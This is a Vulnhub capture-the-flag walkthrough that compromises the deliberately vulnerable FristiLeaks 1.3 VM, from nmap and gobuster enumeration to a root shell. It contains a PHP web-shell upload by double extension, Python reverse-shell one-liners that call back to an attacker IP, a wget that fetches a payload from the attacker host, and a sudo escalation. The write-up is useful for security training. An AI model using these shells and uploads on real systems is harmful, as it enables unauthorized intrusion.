# FristiLeaks:1.3 ~Vulnhub Walkthrough



A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..

Name: Fristileaks 1.3
Author: Ar0xA
Series: Fristileaks
Style: Enumeration/Follow the breadcrumbs
Goal: get root (uid 0) and read the flag file
Tester(s): dqi, barrebas
Difficulty: Basic

## Scanning

scanning all port using nmap 

**nmap -p- Target-ip**

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled.png)

Only 80 port is open

Service version scanning

**nmap -sV -A Target-ip**

```jsx
root@kali:~# nmap -sV -A 192.168.1.8
Starting Nmap 7.80SVN ( https://nmap.org ) at 2020-07-28 05:49 EDT
Nmap scan report for 192.168.1.8
Host is up (0.10s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE    VERSION
80/tcp open  tcpwrapped
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|phone
Running: Linux 2.4.X|2.6.X, Sony Ericsson embedded
OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivaz
OS details: Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phone
Network Distance: 21 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   ... 20
21  138.02 ms 192.168.1.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 212.85 seconds
```

**nmap -sV -A --script vuln target-ip**        (Vulnerability scanning using nmap)

```jsx
root@kali:~# nmap -sV -A --script vuln 192.168.1.8
Starting Nmap 7.80SVN ( https://nmap.org ) at 2020-07-28 06:01 EDT
Nmap scan report for 192.168.1.8
Host is up (0.0024s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE    VERSION
80/tcp open  tcpwrapped
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /robots.txt: Robots file
|   /icons/: Potentially interesting folder w/ directory listing
|_  /images/: Potentially interesting folder w/ directory listing
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|phone
Running: Linux 2.4.X|2.6.X, Sony Ericsson embedded
OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivaz
OS details: Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phone

TRACEROUTE (using port 80/tcp)
HOP RTT    ADDRESS
1   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 660.97 seconds
root@kali:~#
```

## Enumeration

Open target-ip in browser

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%201.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%201.png)

Checking view-source

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%202.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%202.png)

checking robots.txt. We found 3 directories.

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%203.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%203.png)

I accessed all directories and found nothing

Running nikto on target-ip

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%204.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%204.png)

Running gobuster to find directories.

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%205.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%205.png)

No useful directories found

Creating wordlist using cewl

**cewl -w fristi http://target-ip/**

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%206.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%206.png)

Again running gobuster to find directories

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%207.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%207.png)

Found directory fristi

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%208.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%208.png)

Running sqlmap 

**sqlmap -u [http://target-ip/fristi/](http://target-ip/fristi/) --forms --dbs --batch**

```jsx
root@kali:~# sqlmap -u http://192.168.1.8/fristi/ --forms --dbs --batch 
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.6#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:26:27 /2020-07-28/

[12:26:27] [INFO] testing connection to the target URL
[12:26:29] [INFO] searching for forms
[#1] form:
POST http://192.168.1.8/fristi/checklogin.php
POST data: myusername=&mypassword=&Submit=Login
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: myusername=&mypassword=&Submit=Login] (Warning: blank fields detected): myusername=&mypassword=&Submit=Login
do you want to fill blank fields with random values? [Y/n] Y
[12:26:31] [INFO] using '/root/.sqlmap/output/results-07282020_1226pm.csv' as the CSV results file in multiple targets mode
[12:26:31] [INFO] checking if the target is protected by some kind of WAF/IPS
[12:26:31] [INFO] testing if the target URL content is stable
[12:26:32] [INFO] target URL content is stable
[12:26:32] [INFO] testing if POST parameter 'myusername' is dynamic
[12:26:32] [WARNING] POST parameter 'myusername' does not appear to be dynamic
[12:26:32] [WARNING] heuristic (basic) test shows that POST parameter 'myusername' might not be injectable
[12:26:32] [INFO] testing for SQL injection on POST parameter 'myusername'
[12:26:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:26:32] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:26:32] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[12:26:32] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:26:32] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[12:26:32] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[12:26:32] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[12:26:32] [INFO] testing 'Generic inline queries'
[12:26:32] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:26:32] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[12:26:32] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[12:26:32] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:26:32] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[12:26:32] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[12:26:35] [INFO] POST parameter 'myusername' appears to be 'Microsoft SQL Server/Sybase time-based blind (IF)' injectable 
it looks like the back-end DBMS is 'Microsoft SQL Server/Sybase'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'Microsoft SQL Server/Sybase' extending provided level (1) and risk (1) values? [Y/n] Y
[12:26:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[12:26:35] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[12:26:35] [INFO] checking if the injection point on POST parameter 'myusername' is a false positive
[12:26:35] [WARNING] false positive or unexploitable injection point detected
[12:26:35] [WARNING] POST parameter 'myusername' does not seem to be injectable
[12:26:35] [INFO] testing if POST parameter 'mypassword' is dynamic
[12:26:35] [WARNING] POST parameter 'mypassword' does not appear to be dynamic
[12:26:35] [WARNING] heuristic (basic) test shows that POST parameter 'mypassword' might not be injectable
[12:26:35] [INFO] testing for SQL injection on POST parameter 'mypassword'
[12:26:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:26:35] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:26:35] [INFO] testing 'Generic inline queries'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[12:26:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[12:26:35] [WARNING] POST parameter 'mypassword' does not seem to be injectable
[12:26:35] [INFO] testing if POST parameter 'Submit' is dynamic
[12:26:36] [WARNING] POST parameter 'Submit' does not appear to be dynamic
[12:26:36] [WARNING] heuristic (basic) test shows that POST parameter 'Submit' might not be injectable
[12:26:36] [INFO] testing for SQL injection on POST parameter 'Submit'
[12:26:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:26:39] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:26:54] [INFO] testing 'Generic inline queries'
[12:26:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[12:26:57] [WARNING] POST parameter 'Submit' does not seem to be injectable
[12:26:57] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next form
[12:26:57] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.sqlmap/output/results-07282020_1226pm.csv'

[*] ending @ 12:26:57 /2020-07-28/

root@kali:~#
```

/fristi is not vulnerable to sql injection

Checking view-source

User = eezeepz

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%209.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%209.png)

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2010.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2010.png)

using burpsuite to Bruteforce password. 

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2011.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2011.png)

*** No password found

In view-source page, Base64 string is given in comment.

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2012.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2012.png)

Trying to decode.

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2013.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2013.png)

Also it is giving hint that base64 encoding for images

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2014.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2014.png)

Lets decode base64 in image

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2015.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2015.png)

It could be password of user eezeepz.

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2016.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2016.png)

Login Suucessfully. We found upload page.

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2017.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2017.png)

## Exploitation

Trying to upload php shell.

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2018.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2018.png)

Its saying to upload png,gif,jpg file type

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2019.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2019.png)

Uploading php shell using double extension file upload method

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2020.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2020.png)

File is uploaded in /uploads directory

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2021.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2021.png)

http://target-ip/fristi/uploads/simple-shell.php.gif?cmd=id

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2022.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2022.png)

### File upload to Reverse shell

using following payload to take reverse shell

target-ip/fristi/uploads/simple-backdoor.php.gif?cmd= <python-payload>

```jsx
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.122.148",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2023.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2023.png)

cd /var/www

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2024.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2024.png)

cat notes.txt

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2025.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2025.png)

Accessing /home directory. Found 3 user 

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2026.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2026.png)

cd eezeepz

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2027.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2027.png)

Again Found notes.txt in /eezeepz

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2028.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2028.png)

## Privilege escalation

python-payload for reverse shell 

```jsx
/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.122.148",6001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2029.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2029.png)

Sending python-payload file to target server using python server

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2030.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2030.png)

Downloading python-payload on target server

**wget [http://attacker-ip:8000/python-payload](http://attacker-ip:8000/python-payload)** 

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2031.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2031.png)

ls -al

cp python-payload runthis

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2032.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2032.png)

start nc listener on port 6001 

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2033.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2033.png)

Within 2-3 minutes we got shell of admin user

ls -al

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2034.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2034.png)

cat whoisyourgodnow.txt

cat cryptedpass.txt

We found two encrypted password files.

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2035.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2035.png)

cat [cryptpass.py](http://cryptpass.py)                       

Following script is used to encrypt passwords. First of all, it is encoding password in base64, then reversing that string and then again encoding it using rot13.

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2036.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2036.png)

So let's decode passwords that we found earlier.

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2037.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2037.png)

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2038.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2038.png)

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2039.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2039.png)

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2040.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2040.png)

We found two passwords **"LetThereBeFristi!"** and  **"thisisalsopw123"**

su - fristigod

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2041.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2041.png)

**LetThereBeFristi! is password of fristigod**

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2042.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2042.png)

Got privilege of fristigod user

cd .secret_admin_stuff

./doCom

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2043.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2043.png)

Check sudoers list

sudo -l

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2044.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2044.png)

strings doComI

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2045.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2045.png)

It shows how to use ./doCom

./doCom id

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2046.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2046.png)

sudo -u fristi ./doCom id

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2047.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2047.png)

sudo -u fristi ./doCom whoami

sudo -u fristi ./doCom bash

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2048.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2048.png)

Finally we got root shell

cd /root

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2049.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2049.png)

cat fristileaks_secrets.txt

![FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2050.png](FristiLeaks%201%203%20~Vulnhub%20Writeup%20998cb4239e5b440bbbef5a27d1aa24ed/Untitled%2050.png)
